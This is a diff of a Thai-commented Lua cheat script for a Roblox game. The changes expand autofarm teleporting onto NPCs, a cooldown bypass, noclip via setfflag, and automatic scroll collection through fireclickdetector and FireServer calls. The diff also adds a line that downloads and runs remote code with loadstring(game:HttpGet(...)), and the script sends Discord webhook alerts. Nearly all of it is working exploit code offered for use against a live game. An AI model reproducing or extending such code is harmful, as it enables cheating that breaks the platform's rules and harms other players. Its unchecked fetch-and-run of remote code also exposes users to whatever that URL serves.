@@ -1,4 +1,13 @@
--- getgenv().Webhook = ''
+-- ไวริสนับสิ้นเดือนแล้วต้องไปเอาใหม่
+for i = 1,30 do
+    print("\n")
+end
+
+function start()
+    Noti(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\nPrivate Script!","ระยะเวลาการใช้งานเหลือ "..tonumber(LockD - day).." วัน\n Dev : Destroy#9405 , FB : Natthawat", 5)
+    print("ระยะเวลาการใช้งานเหลือ "..tonumber(LockD - day).." วัน")
+    print("Dev : Destroy#9405 , FB : Natthawat")
+    -- getgenv().Webhook = ''
 -- getgenv().DcID = ''
 
 -- เขียนกังๆ by ฟลุ๊คกี้ hardcodeee!!
@@ -13,7 +22,7 @@ print("Private!")
 print("FB : https://www.facebook.com/natthawat.2006")
 
 -- check file
-UpdateVersion = "16-6-2566"
+UpdateVersion = "17-8-2566"
 
 
 -- default save
@@ -23,9 +32,12 @@ local default =  {
     Config = {
         ScriptVersion = UpdateVersion,
         Safemode = false,
+        NotificationCollect = false,
         SelectTailed = false,
         SelectTailed_1 = "None",
         SelectTailed_2 = "None",
+        Collect_Scroll_Companions = false,
+        Collect_Scroll_Race = false,
         Collect_Scroll_Event = false,
         Aizden_Mask_Private = false,
         Aizden_Mask_Public = false,
@@ -201,6 +213,12 @@ local default =  {
 
     };
     Select_Scroll_Event = {
+
+    };
+    Select_Scroll_Companions = {
+
+    };
+    Select_Scroll_Race = {
 
     };
 }
@@ -757,6 +775,7 @@ SpecialAttack = {
     "Shado"
  }
 
+
 -------------------------------------------------------------------------------------------------------------------------
 
 repeat wait() 
@@ -784,15 +803,26 @@ Page1:AddDropdown("Mode ",{
     end;
 })
 
-Page1:AddSlider("Y-axis Camera [Mode NoCD]",{
-    value = set.Config.Y_camera ,
-    min = 0 , 
-    max = -50 , 
-    callback = function(v)
-        set.Config.Y_camera = v
-        save()
-    end,
-})
+
+
+-- Page1:AddTextBox("Y-axis Camera [Mode NoCD]",{
+--     Placeholder = "Y-axis",
+--     callback = function(v)
+--         set.Config.Y_camera = v
+--         save()
+--     end;
+-- })
+
+
+ Page1:AddSlider("Y-axis Camera [Mode NoCD]",{
+     value = set.Config.Y_camera ,
+     min = 0 , 
+     max = -100 , 
+     callback = function(v)
+         set.Config.Y_camera = v
+         save()
+     end,
+ })
 
 
 Page1:AddToggle("Autofarm [Filters]",{
@@ -871,7 +901,7 @@ Page1:AddToggle("Auto Rank [Max fake!]",{
     end,
 })
 
-Page1:AddToggle("Auto ChangeTailed",{
+Page1:AddToggle("Fully Tailed ",{
     Stats = set.Config.AutoChangeTail,
     callback = function(v)
         set.Config.AutoChangeTail = v
@@ -1431,7 +1461,6 @@ Page3:AddToggle("Kill Tailed beast",{
     end,
 })
 
-
 Page3:AddLabel("---------------")
 
 Page3:AddToggle("Auto ChangeTailed",{
@@ -1443,12 +1472,14 @@ Page3:AddToggle("Auto ChangeTailed",{
 
 
 Alltailed = {"None"}
-for i,v in pairs(plr.statz.genkailevel:GetChildren()) do
-    if v.Name ~= "tyntailkg" and (string.find(v.Name,"tail") or string.find(v.Name,"hollow")) then
-        table.insert(Alltailed, v.Name)
-        table.sort(Alltailed)
+pcall(function()
+    for i,v in pairs(plr.statz.genkailevel:GetChildren()) do
+        if v.Name ~= "tyntailkg" and (string.find(v.Name,"tail") or string.find(v.Name,"hollow")) then
+            table.insert(Alltailed, v.Name)
+            table.sort(Alltailed)
+        end
     end
-end
+end)
 
 
 
@@ -1489,7 +1520,6 @@ spawn(function()
         end
     end
 end)
-
 
 local Page4 =  Tap2:CreatePage("Tailed Filters",2) ;
 
@@ -1718,6 +1748,74 @@ Page6:AddToggle("Collect Scroll [Bloodline]",{
     end,
 })
 
+ScrollSelectCompanions = {}
+
+pcall(function()
+    for i,v in pairs(game:GetService("ReplicatedStorage").alljutsu.companions:GetChildren()) do
+        table.insert(ScrollSelectCompanions, v.Name)
+        table.sort(ScrollSelectCompanions)
+    end
+end)
+
+if #ScrollSelectCompanions == 0 then
+    table.insert(ScrollSelectCompanions,"nil")
+end
+
+Page6:AddDropdown("Collect Scroll [Companions]",{
+    Values = ScrollSelectCompanions, 
+    Multi = true ,
+    TextBox = true ,
+    callback = function(v)
+        set.Select_Scroll_Companions = v
+        save()
+        -- print(print(v))
+    end,
+    setup = set.Select_Scroll_Companions
+    
+})
+
+Page6:AddToggle("Collect Scroll [Companions]",{
+    Stats = set.Config.Collect_Scroll_Companions,
+    callback = function(v)
+        set.Config.Collect_Scroll_Companions = v
+        save()
+    end,
+})
+
+ScrollSelectRace = {}
+
+pcall(function()
+    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main.RaceCustom.Frame.ScrollingFrame:GetChildren()) do
+        table.insert(ScrollSelectRace, v.Name)
+        table.sort(ScrollSelectRace)
+    end
+end)
+
+if #ScrollSelectRace == 0 then
+    table.insert(ScrollSelectRace,"nil")
+end
+
+Page6:AddDropdown("Collect Scroll [Race]",{
+    Values = ScrollSelectRace , 
+    Multi = true ,
+    TextBox = true ,
+    callback = function(v)
+        set.Select_Scroll_Race = v
+        save()
+        -- print(print(v))
+    end,
+    setup = set.Select_Scroll_Race
+    
+})
+
+Page6:AddToggle("Collect Scroll [Race]",{
+    Stats = set.Config.Collect_Scroll_Race,
+    callback = function(v)
+        set.Config.Collect_Scroll_Race = v
+        save()
+    end,
+})
+
 
 Page6:AddToggle("Ignore Scroll",{
     Stats = set.Config.IgnoreScroll,
@@ -1758,6 +1856,23 @@ Page7:AddDropdown("Mode Event",{
 })
 
 Page7:AddLabel("No CD (Dagai Bomb)")
+
+DistanceEvent = 50
+Page7:AddSlider("Distance [Event]",{
+    value = DistanceEvent ,
+    min = 0 , 
+    max = 120 , 
+    callback = function(v)
+        DistanceEvent = v
+    end,
+})
+
+Page7:AddToggle("Lock Position",{
+    Stats = false,
+    callback = function(v)
+        LockPosition = v
+    end,
+})
 
 Page7:AddToggle("Auto Boss",{
     Stats = false,
@@ -2720,9 +2835,6 @@ Page14:AddToggle("Auto No Cooldown",{
     Stats = set.Config.No_Cooldown,
     callback = function(v)
         if not v then
-            if plr.Character:FindFirstChild("zombify") then
-                plr.Character:FindFirstChild("zombify"):Destroy()
-            end
             if plr.Character:FindFirstChild("No Cooldown") then
                 plr.Character:FindFirstChild("No Cooldown"):Destroy()
             end
@@ -3037,6 +3149,7 @@ Page17:AddToggle("Reset HP15%",{
     Stats = set.Config.Safemode,
     callback = function(v)
         set.Config.Safemode  = v
+        save()
     end,
 })
 
@@ -3749,6 +3862,14 @@ Page22:AddToggle("Notification Kick!",{
     end,
 })
 
+Page22:AddToggle("Notification Collect!",{
+    Stats = set.Config.NotificationCollect,
+    callback = function(v)
+        set.Config.NotificationCollect = v
+        save()
+    end,
+})
+
 Page22:AddToggle("Auto Rejoin",{
     Stats = set.Config.Auto_Rejoin,
     callback = function(v)
@@ -3973,6 +4094,7 @@ spawn(function()
 end)
 
 -- no clip synx
+
 pcall(function()
 setfflag("HumanoidParallelRemoveNoPhysics", "False")
 setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
@@ -4009,6 +4131,14 @@ spawn(function()
     while wait() do
         if set.Config.Autofarm then
         pcall(function()
+            if set.Config.No_Cooldown then
+                if not plr.Character:FindFirstChild("No Cooldown") then
+                    PosOld = plr.Character.HumanoidRootPart.CFrame
+                    repeat wait()
+                    plr.Character.HumanoidRootPart.CFrame = PosOld * CFrame.new(0,30,0)
+                    until plr.Character:FindFirstChild("No Cooldown") or set.Config.Autofarm == false
+                end
+            end
             if plr.currentmission.Value == nil then -- ให้รับเควส
                 if set.Config.Autofarm_Gingerbread then -- สัตว์หางเควส
                     if game:GetService("Workspace"):FindFirstChild("eventbossmission") then
@@ -4414,7 +4544,7 @@ spawn(function()
                     end
                 end
             else -- ทำเควส
-                if string.find(plr.PlayerGui.Main.ingame.Missionstory.bg.name.Text,"TAILED Spirit") and not SpawnScroll then
+                if (string.find(plr.PlayerGui.Main.ingame.Missionstory.bg.name.Text,"TAILED Spirit") or string.find(plr.PlayerGui.Main.ingame.Missionstory.bg.name.Text,"Ginger") or string.find(plr.PlayerGui.Main.ingame.Missionstory.bg.name.Text,"Tentail")) and not SpawnScroll then
                     for i,v in pairs(game:GetService("Workspace").npc:GetChildren()) do
                         if v.ClassName == "Model" and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and string.find(v.Name, "npc") and not v:FindFirstChild("owner")
                             and v:FindFirstChild("megaboss") and v.Humanoid.Health > 0 and v.Head.CFrame.Y > -1000 and not SpawnScroll then -- เช็คชื่อตรง ui บนหัวมอน เพราะ npc หลอกมัน ชื่อ Mob name
@@ -4449,54 +4579,107 @@ spawn(function()
                         end
                     end
                 elseif string.find(plr.PlayerGui.Main.ingame.Missionstory.bg.name.Text,"Defeat") and not SpawnScroll then
-                    tptargetQuest()
-                    for i,v in pairs(game:GetService("Workspace").npc:GetChildren()) do
-                        if v.ClassName == "Model" and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and string.find(v.Name, "npc") and not v:FindFirstChild("owner") and v.Head.mob.fram.info2.Text ~= "[HP: 0 ]" and not v:FindFirstChild("fullsusanoo")
-                            and v.Humanoid.Health > 0 and v.Head.CFrame.Y > -1000 and not SpawnScroll and (v.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <= 300 then -- เช็คชื่อตรง ui บนหัวมอน เพราะ npc หลอกมัน ชื่อ Mob name
-                                if set.Config.Mode_Autofarm == "No Cooldown" then
-                                    repeat game:GetService("RunService").RenderStepped:wait()                                     
-                                        if v:FindFirstChild("megaboss") then
-                                            game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position + Vector3.new(0,set.Config.Y_camera,0)) 
-                                            --zoom()
-                                            plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(50,-17,0)       
-                                        else
-                                            plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(0,15,-7)
-                                            game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
-                                            zoom()
-                                        end
-                                        if not v:FindFirstChild("megaboss") then
-                                            v.Humanoid:ChangeState(15)
-                                        end
-                                    until  not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
-                                     --LockSpirit = false
-                                    zoomout()
-                                elseif set.Config.Mode_Autofarm == "Shado" then
-                                    repeat game:GetService("RunService").RenderStepped:wait()
-                                        if syn then
-                                            game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
-                                            plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,90,0) * CFrame.Angles(math.rad(-90),0,0)
-                                            zoom()
-                                        else
-                                            game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
-                                            plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,-95)
-                                            wait(.3)
-                                        end
-                                    until not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
-                                    zoomout()
-                                elseif set.Config.Mode_Autofarm == "Normal" then
-                                    repeat game:GetService("RunService").RenderStepped:wait()                                  
-                                        -- game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
-                                        plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(0,6,2) * CFrame.Angles(math.rad(-90),0,0)
-                                        attack()
-                                        if not v:FindFirstChild("megaboss") then
-                                            v.Humanoid:ChangeState(15)
-                                        end
-                                    until v.hit.Value == true or not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
-                                    zoomout()
-                                    wait(.2)
-                                end
-                            if set.Config.Autofarm == false then return end
-                            zoomout()
+                    if string.find(plr.PlayerGui.Main.ingame.Missionstory.bg.name.Text,"(s)") and not SpawnScroll then -- มอนปกติ
+                        tptargetQuest()
+                        for i,v in pairs(game:GetService("Workspace").npc:GetChildren()) do
+                            if v.ClassName == "Model" and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and string.find(v.Name, "npc") and not v:FindFirstChild("owner") and v.Head.mob.fram.info2.Text ~= "[HP: 0 ]"
+                                and v.Humanoid.Health > 0 and v.Head.CFrame.Y > -1000 and not SpawnScroll and (v.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <= 300 then -- เช็คชื่อตรง ui บนหัวมอน เพราะ npc หลอกมัน ชื่อ Mob name -- not v:FindFirstChild("fullsusanoo")
+                                    if set.Config.Mode_Autofarm == "No Cooldown" then
+                                        repeat game:GetService("RunService").RenderStepped:wait()                                     
+                                            if v:FindFirstChild("megaboss") then
+                                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                                --zoom()
+                                                plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(0,30,-7)       
+                                            else
+                                                plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(0,30,-7)
+                                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                                zoom()
+                                            end
+                                            if not v:FindFirstChild("megaboss") then
+                                                v.Humanoid:ChangeState(15)
+                                            end
+                                        until  not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
+                                        --LockSpirit = false
+                                        zoomout()
+                                    elseif set.Config.Mode_Autofarm == "Shado" then
+                                        repeat game:GetService("RunService").RenderStepped:wait()
+                                            if syn then
+                                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                                plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,90,0) * CFrame.Angles(math.rad(-90),0,0)
+                                                zoom()
+                                            else
+                                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                                plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,-95)
+                                                wait(.3)
+                                            end
+                                        until not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
+                                        zoomout()
+                                    elseif set.Config.Mode_Autofarm == "Normal" then
+                                        repeat game:GetService("RunService").RenderStepped:wait()                                  
+                                            -- game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                            plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(0,6,2) * CFrame.Angles(math.rad(-90),0,0)
+                                            attack()
+                                            if not v:FindFirstChild("megaboss") then
+                                                v.Humanoid:ChangeState(15)
+                                            end
+                                        until v.hit.Value == true or not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
+                                        zoomout()
+                                        wait(.2)
+                                    end
+                                if set.Config.Autofarm == false then return end
+                                zoomout()
+                            end
+                        end
+                    elseif not string.find(plr.PlayerGui.Main.ingame.Missionstory.bg.name.Text,"(s)") and not SpawnScroll then -- พวกบอส
+                        tptargetQuest()
+                        for i,v in pairs(game:GetService("Workspace").npc:GetChildren()) do
+                            if v.ClassName == "Model" and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and string.find(v.Name, "npc") and not v:FindFirstChild("owner") and v.Head.mob.fram.info2.Text ~= "[HP: 0 ]"
+                                and v.Humanoid.Health > 0 and v.Head.CFrame.Y > -1000 and not SpawnScroll and (v.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <= 300 then -- เช็คชื่อตรง ui บนหัวมอน เพราะ npc หลอกมัน ชื่อ Mob name -- not v:FindFirstChild("fullsusanoo")
+                                    if set.Config.Mode_Autofarm == "No Cooldown" then
+                                        repeat game:GetService("RunService").RenderStepped:wait()                                     
+                                            if v:FindFirstChild("megaboss") then
+                                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position + Vector3.new(0,set.Config.Y_camera,0))
+                                                --zoom()
+                                                plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(0,30,-7)       
+                                            else
+                                                plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(0,30,-7)
+                                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position + Vector3.new(0,set.Config.Y_camera,0)) 
+                                                zoom()
+                                            end
+                                            if not v:FindFirstChild("megaboss") then
+                                                v.Humanoid:ChangeState(15)
+                                            end
+                                        until  not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
+                                        --LockSpirit = false
+                                        zoomout()
+                                    elseif set.Config.Mode_Autofarm == "Shado" then
+                                        repeat game:GetService("RunService").RenderStepped:wait()
+                                            if syn then
+                                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                                plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,90,0) * CFrame.Angles(math.rad(-90),0,0)
+                                                zoom()
+                                            else
+                                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                                plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,-95)
+                                                wait(.3)
+                                            end
+                                        until not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
+                                        zoomout()
+                                    elseif set.Config.Mode_Autofarm == "Normal" then
+                                        repeat game:GetService("RunService").RenderStepped:wait()                                  
+                                            -- game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                            plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame  * CFrame.new(0,6,2) * CFrame.Angles(math.rad(-90),0,0)
+                                            attack()
+                                            if not v:FindFirstChild("megaboss") then
+                                                v.Humanoid:ChangeState(15)
+                                            end
+                                        until v.hit.Value == true or not set.Config.Autofarm or plr.currentmission.Value == nil or not v.Parent or SpawnScroll
+                                        zoomout()
+                                        wait(.2)
+                                    end
+                                if set.Config.Autofarm == false then return end
+                                zoomout()
+                            end
                         end
                     end
                 elseif string.find(plr.PlayerGui.Main.ingame.Missionstory.bg.name.Text,"!") then
@@ -5663,12 +5846,16 @@ end)
 
 local ViSendMouseButtonEvent = game:service'VirtualInputManager'
 function Click()
+    pcall(function()
     ViSendMouseButtonEvent:SendMouseButtonEvent(50,50, 0, true, game, 1)
     ViSendMouseButtonEvent:SendMouseButtonEvent(50, 50, 0, false, game, 1)
     game:GetService("VirtualUser"):CaptureController()
     game:GetService("VirtualUser"):ClickButton1(Vector2.new(50,50))
+    end)
 end
 
+
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
 
 function ScrollEvent()
     pcall(function()
@@ -5685,20 +5872,23 @@ function ScrollEvent()
                                 end
                                plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                 SpawnScroll = true
+                                if set.Config.NotificationCollect then
+                                    Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                                end
                                 repeat game:GetService("RunService").RenderStepped:wait()
                                     pcall(function()
-                                       plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
-                                       zoom()
-                                       game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
-                                       Click()
+                                        plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                                        zoom()
+                                        game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
+                                        Click()
                                         if v.sh:FindFirstChild("invoke") then     
                                             v.sh.invoke:FireServer(game.Players.LocalPlayer)
                                         end
                                         fireclickdetector(v.sh.ClickDetector)                                           
                                     end)
                                 until not v.Parent or not  set.Config.Collect_Scroll or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll) or not game:GetService("Workspace"):FindFirstChild("scrolltimepain")
-                                SpawnScroll = false
                                 zoomout()
+                                SpawnScroll = false
                             end
                         else
                             if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
@@ -5706,20 +5896,23 @@ function ScrollEvent()
                             end
                            plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                             SpawnScroll = true
+                            if set.Config.NotificationCollect then
+                                Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                            end
                             repeat game:GetService("RunService").RenderStepped:wait()
                                 pcall(function()
                                     plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                     zoom()
                                     game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                                     Click()
-                                     if v.sh:FindFirstChild("invoke") then     
-                                         v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                     end
-                                     fireclickdetector(v.sh.ClickDetector)    
+                                    if v.sh:FindFirstChild("invoke") then     
+                                        v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                    end                       
+                                    fireclickdetector(v.sh.ClickDetector)
                                 end)
                             until not v.Parent or not  set.Config.Collect_Scroll or CheckJin == true or IgnoreScroll or not game:GetService("Workspace"):FindFirstChild("scrolltimepain")
-                            SpawnScroll = false
                             zoomout()
+                            SpawnScroll = false
                         end
                     end
                 end
@@ -5736,20 +5929,23 @@ function ScrollEvent()
                                 end
                                 plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                 SpawnScroll = true
+                                if set.Config.NotificationCollect then
+                                    Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                                end
                                 repeat game:GetService("RunService").RenderStepped:wait()
                                     pcall(function()
                                         plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                         zoom()
                                         game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                                         Click()
-                                         if v.sh:FindFirstChild("invoke") then     
-                                             v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                         end
-                                         fireclickdetector(v.sh.ClickDetector)    
+                                            if v.sh:FindFirstChild("invoke") then     
+                                                v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                            end
+                                            fireclickdetector(v.sh.ClickDetector)
                                     end)
                                 until not v.Parent or not  set.Config.Collect_Scroll or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll) or not game:GetService("Workspace"):FindFirstChild("scrolltimeforge")
-                                SpawnScroll = false
                                 zoomout()
+                                SpawnScroll = false
                             end
                         else
                             if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
@@ -5757,20 +5953,23 @@ function ScrollEvent()
                             end
                            plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                             SpawnScroll = true
+                            if set.Config.NotificationCollect then
+                                Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                            end
                             repeat game:GetService("RunService").RenderStepped:wait()
                                 pcall(function()
                                     plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                     zoom()
                                     game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                                     Click()
-                                     if v.sh:FindFirstChild("invoke") then     
-                                         v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                     end
-                                     fireclickdetector(v.sh.ClickDetector)    
+                                        if v.sh:FindFirstChild("invoke") then     
+                                            v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                        end                       
+                                        fireclickdetector(v.sh.ClickDetector)
                                 end)
                             until not v.Parent or not  set.Config.Collect_Scroll or CheckJin == true or IgnoreScroll or not game:GetService("Workspace"):FindFirstChild("scrolltimeforge")
-                            SpawnScroll = false
                             zoomout()
+                            SpawnScroll = false
                         end
                     end
                 end
@@ -5787,20 +5986,23 @@ function ScrollEvent()
                                 end
                                 plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                 SpawnScroll = true
+                                if set.Config.NotificationCollect then
+                                    Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                                end
                                 repeat game:GetService("RunService").RenderStepped:wait()
                                     pcall(function()
                                         plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                         zoom()
                                         game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                                         Click()
-                                         if v.sh:FindFirstChild("invoke") then     
-                                             v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                         end
-                                         fireclickdetector(v.sh.ClickDetector)    
+                                            if v.sh:FindFirstChild("invoke") then     
+                                                v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                            end
+                                            fireclickdetector(v.sh.ClickDetector)
                                     end)
                                 until not v.Parent or not  set.Config.Collect_Scroll or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll) or not game:GetService("Workspace"):FindFirstChild("scrolltimeshindai")
-                                SpawnScroll = false
                                 zoomout()
+                                SpawnScroll = false
                             end
                         else
                             if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
@@ -5808,20 +6010,23 @@ function ScrollEvent()
                             end
                            plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                             SpawnScroll = true
+                            if set.Config.NotificationCollect then
+                                Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                            end
                             repeat game:GetService("RunService").RenderStepped:wait()
                                 pcall(function()
                                     plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                     zoom()
                                     game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                                     Click()
-                                     if v.sh:FindFirstChild("invoke") then     
-                                         v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                     end
-                                     fireclickdetector(v.sh.ClickDetector)    
+                                        if v.sh:FindFirstChild("invoke") then     
+                                            v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                        end                       
+                                        fireclickdetector(v.sh.ClickDetector)
                                 end)
                             until not v.Parent or not  set.Config.Collect_Scroll or CheckJin == true or IgnoreScroll or not game:GetService("Workspace"):FindFirstChild("scrolltimeshindai")
-                            SpawnScroll = false
                             zoomout()
+                            SpawnScroll = false
                         end
                     end
                 end
@@ -5843,20 +6048,23 @@ function ScrollSpawn()
                     end
                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                     SpawnScroll = true
+                    if set.Config.NotificationCollect then
+                        Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                    end
                     repeat game:GetService("RunService").RenderStepped:wait()
                         pcall(function()
                             plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                             zoom()
                             game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                             Click()
-                             if v.sh:FindFirstChild("invoke") then     
-                                 v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                             end
-                             fireclickdetector(v.sh.ClickDetector)    
+                                if v.sh:FindFirstChild("invoke") then     
+                                    v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                end
+                                fireclickdetector(v.sh.ClickDetector)
                         end)
                     until not v.Parent or not  set.Config.Collect_Scroll or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll)
-                    SpawnScroll = false
                     zoomout()
+                    SpawnScroll = false
                 end
             else
                 if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
@@ -5864,20 +6072,23 @@ function ScrollSpawn()
                 end
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                 SpawnScroll = true
+                if set.Config.NotificationCollect then
+                    Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                end
                 repeat game:GetService("RunService").RenderStepped:wait()
                     pcall(function()
                         plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                         zoom()
                         game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                         Click()
-                         if v.sh:FindFirstChild("invoke") then     
-                             v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                         end
-                         fireclickdetector(v.sh.ClickDetector)    
+                            if v.sh:FindFirstChild("invoke") then     
+                                v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                            end                       
